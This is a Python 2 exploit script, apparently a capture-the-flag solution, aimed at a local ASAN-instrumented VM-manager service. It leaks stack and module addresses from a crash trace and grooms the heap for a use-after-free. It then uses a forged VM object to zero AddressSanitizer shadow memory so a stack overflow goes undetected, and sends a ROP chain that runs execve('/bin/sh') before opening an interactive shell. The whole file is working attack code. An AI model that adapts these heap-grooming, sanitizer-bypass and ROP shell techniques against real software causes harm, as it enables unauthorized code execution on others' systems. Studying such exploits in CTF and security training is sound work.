#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib


ADDR = "localhost"
PORT = 8888
DEBUG = False

s = socket.create_connection((ADDR, PORT))

def p64(a):
    return struct.pack("<Q", a)

def p32(a):
    return struct.pack("<I", a)

def rtil_str(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DEBUG:
        sys.stdout.write(buf)
    return buf

def comm(rx, tx):
    rtil_str(rx)
    n = s.send(tx)
    if DEBUG:
        print "Sent %d"%(n)

def add_vm(name, plen, code, memsize):
    s.send("add\n")
    comm(": ", name + "\n")
    comm(": ", str(plen) + "\n")
    comm(": ", code + "\n")
    comm(": ", str(memsize) + "\n")
    return rtil_str("Option: ")

def remove_vm(idx):
    s.send("remove\n")
    comm(": ", str(idx) + "\n")
    return rtil_str("Option: ")

def change(idx, data):
    s.send("change\n")
    comm(": ", str(idx) + "\n")
    comm(": ", data + "\n")
    return rtil_str("Option: ")

def select_vm(idx):
    s.send("select\n")
    comm(": ", str(idx) + "\n")
    return rtil_str("Option: ")

def run_vm(iput=None):
    s.send("run\n")
    if iput is not None:
        s.send(iput)
    return rtil_str("Option: ")



# lets leak things first
add_vm("poop", 64, "a", 64)
add_vm("poop", 64, "a", 64)

select_vm(2)
remove_vm(2)
run_vm()

stktrace = rtil_str("ABORTING")
stktrace = stktrace.split("\n")
stack_addr = stktrace[2].split("sp")[1].split(" ")[1].strip()
stack_addr = int(stack_addr, 16)
mod_addr = stktrace[5].split("#2")[1].split(" ")[1]
mod_addr = int(mod_addr, 16)

module_base = mod_addr - 0xbf1c0 					# .text base
stack_addr = stack_addr + 0xe0						# stack address of the 'challenge' function 

print "[+] Stack address : %s [+]"%(hex(stack_addr))
print "[+] Module base: %s [+]"%(hex(module_base))

s.close()

# now we exploit the baby
s = socket.create_connection((ADDR, PORT))

rtil_str("Option: ")

print "[+] Initializing ASAN heap [+]"

add_vm("A" * 15, 0x400, "Z" * 8, 0xfffff)
add_vm("A" * 15, 0x400, "Z" * 8, 0xfffff)
add_vm("A" * 15, 0x400, "Z" * 8, 0xfffff)

print "[+] Filling up freelist FIFO [+]"

# we repeatedly allocate and free chunks
# to fill the freelist FIFO

for i in range(254):
    print "alloc: %d"%(i)
    if i == 22:
        add_vm("L" * 15, 0x400, "Z" * 8, 0xfffff)
        add_vm("B" * 15, 0x400, "Z" * 8, 0xfffff)
        add_vm("C" * 15, 0x400, "Z" * 8, 0xfffff)
        select_vm(3)
        remove_vm(3)
    else:
        add_vm("A" * 15, 0x400, "Z" * 8, 0xfffff)
    remove_vm(1)

print "[+] UAFing [+]"

# shadow stack address
# we will zero out the bytes here
stack_shadow_addr = (stack_addr >> 3) + 0x7fff8000



# we use the VM to zero out the shadow bytes
# of the stack of the challenge function
# having the shadow bytes to zero means
# that the correspoing addresses are 
# addressable
# This way the stack overflow in the "main routine" funcion
# will not trigger ASAN

bf = "A" * 15
fake_vm = p64(stack_shadow_addr)                    # memory buffer
fake_vm += p32(0x40)                                # memory size
fake_vm += p32(0x42424242)
fake_vm += p64(0x5a5a5a5a5a5a5a5a)                  # code buffer
fake_vm += p32(0x0)                                 # program_length
fake_vm += p32(0x42424242)                          # stack pointer
fake_vm += p64(0x5a5a5a5a5a5a5a5a)                  # vm_link
fake_vm += bf

add_vm("olap", 0x38, fake_vm, 0x0)
run_vm()

# we exploit the buffer overflow
sh_str = stack_addr + 0xc0                          # address of argv[0]
sh_str_p = stack_addr + 0xc8                        # argv

syscall_g = module_base + 0xb2308
prsi = module_base + 0xbb079
prdi = module_base + 0xbf6c3
prdx = module_base + 0xb9e11
prax = module_base + 0xb8627

buf = "A" * 88
buf += p64(prdi) + p64(sh_str)
buf += p64(prsi) + p64(sh_str_p)
buf += p64(prdx) + p64(0x0)
buf += p64(prax) + p64(59)
buf += p64(syscall_g)
buf += "/bin/sh\x00"
buf += p64(sh_str)
buf += p64(0x0)

s.send(buf + "\n")
rtil_str("Option: ")

# trigger
s.send("exit\n")

print "[+] Shell [+]"
t = telnetlib.Telnet()
t.sock = s
t.interact()
